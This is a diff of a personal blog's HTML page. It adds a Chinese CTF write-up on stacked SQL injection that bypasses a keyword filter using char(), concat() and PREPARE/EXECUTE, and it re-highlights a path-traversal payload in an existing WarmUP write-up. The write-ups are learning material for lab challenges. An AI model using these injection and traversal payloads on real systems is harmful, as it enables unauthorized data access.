@@ -282,6 +282,177 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/18/BUUCTF-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="diao-diao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="diao-diao-UPUP">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/18/BUUCTF-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/" itemprop="url">BUUCTF-随便注 1</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-18T08:26:03+08:00">
+                2020-01-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WP/" itemprop="url" rel="index">
+                    <span itemprop="name">WP</span>
+                  </a>
+                </span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WP/WEB/" itemprop="url" rel="index">
+                    <span itemprop="name">WEB</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="随便注-1"><a href="#随便注-1" class="headerlink" title="随便注 1"></a>随便注 1</h1><p>之前在强网杯的时候遇到这道题，当时卡了挺久的，就差最后一步 真的太可惜了</p>
+<p>先随便点击一下提交<br><img src="/images/BUUCTF/%E9%9A%8F%E4%BE%BF%E6%B3%A81/0.png" alt="avatar"></p>
+<p>看得出是一个sql注入类型的题目</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line"><span class="number">1</span> 没有报错</span><br><span class="line"><span class="number">1</span><span class="string">' 出现报错，验证存在注入</span></span><br><span class="line"><span class="string">1’# 没有报错</span></span><br><span class="line"><span class="string">1'</span> order by <span class="number">1</span><span class="comment"># 没有报错</span></span><br><span class="line"><span class="number">1</span><span class="string">' order by 3# 出现报错，证明字段有2个</span></span><br><span class="line"><span class="string">1'</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,2<span class="comment">#   return preg_match("/select|update|delete|drop|insert|where|\./i",$inject); 过滤掉了很多关键字</span></span></span><br></pre></td></tr></table></figure>
+<p>当时就卡在这里，现在想想还是很亏没有考虑的很多，赛后看了大佬们的WP才知道思路：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">databases</span>;<span class="comment"># 成功，说明存在堆叠注入</span></span><br></pre></td></tr></table></figure>
+<p>堆叠注入可以参考一下：<br><a href="https://www.cnblogs.com/0nth3way/articles/7128189.html" target="_blank" rel="noopener">https://www.cnblogs.com/0nth3way/articles/7128189.html</a></p>
+<p>我的理解下来，加上学完了数据库原理，大概意思就是;在数据库中代表一条语句的结束，系统识别到;时，前面的代码在系统中就被视为已经结束，所以可以利用;来进行堆叠注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment"># 得到表名1919810931114514</span></span><br></pre></td></tr></table></figure>
+<p>这里用到了Mysql的预处理语句，可以参考这里：<a href="https://www.cnblogs.com/geaozhang/p/9891338.html" target="_blank" rel="noopener">https://www.cnblogs.com/geaozhang/p/9891338.html</a></p>
+<p>感觉有点像数据库安全那里，创建角色，然后把权限赋值给该角色，再通过该角色依次赋予权限，主要是为了省事。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PREPARE</span> sqla <span class="keyword">FROM</span> <span class="string">'[my sql sequece]'</span>; 预定义<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">EXECUTE</span> sqla; 执行预定义<span class="keyword">sql</span>语句</span><br><span class="line">(<span class="keyword">DEALLOCATE</span> || <span class="keyword">DROP</span>) <span class="keyword">PREPARE</span> sqla; 删除预定义<span class="keyword">SQL</span>语句</span><br></pre></td></tr></table></figure>
+<p>也可以通过变量传输</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> @tn=<span class="string">'hahaha'</span>; 存储表名</span><br><span class="line"><span class="keyword">SET</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'select * from '</span>,@tn); 存储sql语句</span><br><span class="line"><span class="keyword">PREPARE</span> sqla <span class="keyword">FROM</span> @<span class="keyword">sql</span>; 预定义SQL语句</span><br><span class="line"><span class="keyword">EXECUTE</span> sqla; 执行SQL预定义语句</span><br><span class="line">(<span class="keyword">DEALLOCATE</span> || <span class="keyword">DROP</span>) <span class="keyword">PREPARE</span> sqla; 删除预定义SQL语句</span><br></pre></td></tr></table></figure>
+
+<p>构造payload<br>这里可以用char()方法将ASCII码转换为select字符串，再利用concat()拼接</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11';<span class="keyword">SET</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">115</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>),<span class="string">" * from `1919810931114514`"</span>);<span class="keyword">PREPARE</span> sqla <span class="keyword">from</span> @<span class="keyword">sql</span>;EXECUTEsqla;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/18/BUUCTF-WarmUP/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -394,11 +565,11 @@
 <p>通过代码审计可以得到还有一个hint.php  访问得到：<br>flag not here, and flag in ffffllllaaaagggg</p>
 <p>所以考虑最后的payload需要用到ffffllllaaaagggg</p>
 <p>并且得到参数名称为file</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (! empty($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&apos;file&apos;];</span><br><span class="line">        exit;</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! empty(<span class="variable">$_REQUEST</span>[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include <span class="variable">$_REQUEST</span>[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>
 <p> 关键代码，得知file变量不能为空，必须是字符串，还必须通过checkFile的检查<br> 经过查询函数：mb_strpos和mb_substr 的意思是截取变量page中？前面的字符串进行白名单校验<br> 所以source.php和hint.php均在白名单内，随意取一个构造payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php?/../../../../../../../../../../../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">file</span>=hint.php?<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
 <p>发现无法通过，是因为进行了三次检查，所以考虑URL编码问题，把?进行URL编码(注意使用英文?)<br>进行三次编码后?变为：%253F<br>构造payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=hint.php%253F/../../../../../../../../../../../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">file</span>=hint.php%<span class="number">253</span>F<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
 <p>得到flag</p>
 
           
@@ -1496,7 +1667,7 @@ ISP:互联网服务提供商（移动，电信，联通）</code></pre><p><img s
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">36</span>
+                  <span class="site-state-item-count">37</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1507,7 +1678,7 @@ ISP:互联网服务提供商（移动，电信，联通）</code></pre><p><img s
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
